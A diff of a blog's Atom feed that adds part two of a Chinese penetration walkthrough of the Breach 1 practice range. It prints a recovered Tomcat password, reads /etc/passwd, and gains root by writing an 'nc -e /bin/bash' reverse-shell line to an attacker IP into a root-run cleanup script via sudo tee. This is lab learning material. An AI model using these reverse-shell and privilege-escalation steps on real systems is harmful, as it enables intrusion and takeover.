@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-09-16T16:32:09.171Z</updated>
+  <updated>2021-09-17T07:31:21.222Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>breach1靶场渗透（二）</title>
+    <link href="http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+    <id>http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
+    <published>2021-09-17T05:05:38.000Z</published>
+    <updated>2021-09-17T07:31:21.222Z</updated>
+    
+    <content type="html"><![CDATA[<p>紧接上一回，看看过滤后的记录，找到一条链接：</p><p><a href="https://imgtu.com/i/4KeOTH"><img src="https://z3.ax1x.com/2021/09/17/4KeOTH.png" alt="4KeOTH.png" /></a></p><p>打开网页看看，并不能正确响应，看到地址栏提示不安全？</p><p><a href="https://imgtu.com/i/4Km8AJ"><img src="https://z3.ax1x.com/2021/09/17/4Km8AJ.png" alt="4Km8AJ.png" /></a></p><p>https为何提示不安全？证书过期了么？</p><p>换个火狐浏览器打开试试看，提示是不安全的连接。可能是浏览器认为证书过期。尝试使用burp做个转发（就是加个burp代理，拦截再放过请求包。）因为burp的证书是受信任的：</p><p><a href="https://imgtu.com/i/4Knhxx"><img src="https://z3.ax1x.com/2021/09/17/4Knhxx.png" alt="4Knhxx.png" /></a></p><p>OK，新的页面，新的希望。一个HTTP basic 验证。回到鲨鱼，往下再看看记录。在第三条找到了basic关键字：</p><p><a href="https://imgtu.com/i/4KuEzq"><img src="https://z3.ax1x.com/2021/09/17/4KuEzq.png" alt="4KuEzq.png" /></a></p><p>尝试解码看看：</p><p><a href="https://imgtu.com/i/4Ku66P"><img src="https://z3.ax1x.com/2021/09/17/4Ku66P.png" alt="4Ku66P.png" /></a></p><p>获取到一组用户密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u=G)4m7zB</span><br></pre></td></tr></table></figure><p>登录看看，一个tomcat的后台：</p><p><a href="https://imgtu.com/i/4KKJhj"><img src="https://z3.ax1x.com/2021/09/17/4KKJhj.png" alt="4KKJhj.png" /></a></p><p>看到文件上传的位置：</p><p><a href="https://imgtu.com/i/4KQWTO"><img src="https://z3.ax1x.com/2021/09/17/4KQWTO.png" alt="4KQWTO.png" /></a></p><p>使用msf生成一个反弹shell的马：</p><p><a href="https://imgtu.com/i/4KlsUS"><img src="https://z3.ax1x.com/2021/09/17/4KlsUS.png" alt="4KlsUS.png" /></a></p><p>同时开启监听：</p><p><a href="https://imgtu.com/i/4Kl4bV"><img src="https://z3.ax1x.com/2021/09/17/4Kl4bV.png" alt="4Kl4bV.png" /></a></p><p>将生成好的文件上传并且访问：</p><p><a href="https://imgtu.com/i/4K1VqP"><img src="https://z3.ax1x.com/2021/09/17/4K1VqP.png" alt="4K1VqP.png" /></a></p><p>回到msf看到shell:</p><p><a href="https://imgtu.com/i/4K1Gq0"><img src="https://z3.ax1x.com/2021/09/17/4K1Gq0.png" alt="4K1Gq0.png" /></a></p><p>尝试获取交互shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty. spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4K80D1"><img src="https://z3.ax1x.com/2021/09/17/4K80D1.png" alt="4K80D1.png" /></a></p><p>看看内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a 看到版本是Linux Breach 4.2.0-27-generic</span><br></pre></td></tr></table></figure><p>msf里看看有没有可以利用的漏洞。结果并没有</p><p>那就看看有没有什么敏感文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name </span><br></pre></td></tr></table></figure><p>读取到/etc/passwd文件：</p><p><a href="https://imgtu.com/i/4KJy1e"><img src="https://z3.ax1x.com/2021/09/17/4KJy1e.png" alt="4KJy1e.png" /></a></p><p>逐级查看目录，在www目录下看到两个文件，打开5446文件，莫名的php文件</p><p><a href="https://imgtu.com/i/4KtcdI"><img src="https://z3.ax1x.com/2021/09/17/4KtcdI.png" alt="4KtcdI.png" /></a></p><p>打开查看，是数据库的账号密码文件，账号是root,密码是空。</p><p><a href="https://imgtu.com/i/4Kt7es"><img src="https://z3.ax1x.com/2021/09/17/4Kt7es.png" alt="4Kt7es.png" /></a></p><p>连接数据库：</p><p><a href="https://imgtu.com/i/4KNZlD"><img src="https://z3.ax1x.com/2021/09/17/4KNZlD.png" alt="4KNZlD.png" /></a></p><p>在user表内找打了账号，密码信息：</p><p><a href="https://imgtu.com/i/4KN4tx"><img src="https://z3.ax1x.com/2021/09/17/4KN4tx.png" alt="4KN4tx.png" /></a></p><p>对milton的密码解密（哈希值）：</p><p><a href="https://imgtu.com/i/4KUsUI"><img src="https://z3.ax1x.com/2021/09/17/4KUsUI.png" alt="4KUsUI.png" /></a></p><p>切换用户：</p><p><a href="https://imgtu.com/i/4KaQRf"><img src="https://z3.ax1x.com/2021/09/17/4KaQRf.png" alt="4KaQRf.png" /></a></p><p>再重复之前的操作，查看文件，看看历史执行，看看能不能root执行什么，结果并没有。在历史命令里我们看到切换到了blubergh账号，但是我们并没有找到他的密码？</p><p>只能回过头去看，慢慢寻找。想起之前目录扫描时的图片目录，把所有的图片下载下来，strings 或者exiftool看看照片有没有注释。</p><p>[<img src="https://z3.ax1x.com/2021/09/17/4KDmCR.png" alt="4KDmCR.png" />](<a href="https://imgtu.com/i/4KDmCR">https://imgtu.com/i/4KDmCR</a></p><p>尝试切换，确实是密码，看看权限：</p><p><a href="https://imgtu.com/i/4KDwKf"><img src="https://z3.ax1x.com/2021/09/17/4KDwKf.png" alt="4KDwKf.png" /></a></p><p>两个文件能以root身份执行，其中tidyup是用来隔一段时间删除tomcat上传的文件用来防止黑客</p><p>另一个文件tee:</p><p><a href="https://imgtu.com/i/4Ky8VU"><img src="https://z3.ax1x.com/2021/09/17/4Ky8VU.png" alt="4Ky8VU.png" /></a></p><p>如此，我们可以利用第一个命令向第二个文件内写入一个定时任务，第二个文件每三分钟执行一次:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.110.129 5555&quot; &gt; shell.txt</span><br><span class="line"></span><br><span class="line">cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure><p>随后我们在msf机器开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><p>等待一段时间：</p><p><a href="https://imgtu.com/i/4KgRz9"><img src="https://z3.ax1x.com/2021/09/17/4KgRz9.png" alt="4KgRz9.png" /></a></p><p><a href="https://imgtu.com/i/4K2iWQ"><img src="https://z3.ax1x.com/2021/09/17/4K2iWQ.png" alt="4K2iWQ.png" /></a></p><p>结束。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;紧接上一回，看看过滤后的记录，找到一条链接：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://imgtu.com/i/4KeOTH&quot;&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/09/17/4KeOTH.png&quot; alt=&quot;4KeOTH.png&quot; </summary>
+      
+    
+    
+    
+    
+    <category term="breach 渗透测试" scheme="http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>breach1靶场渗透</title>
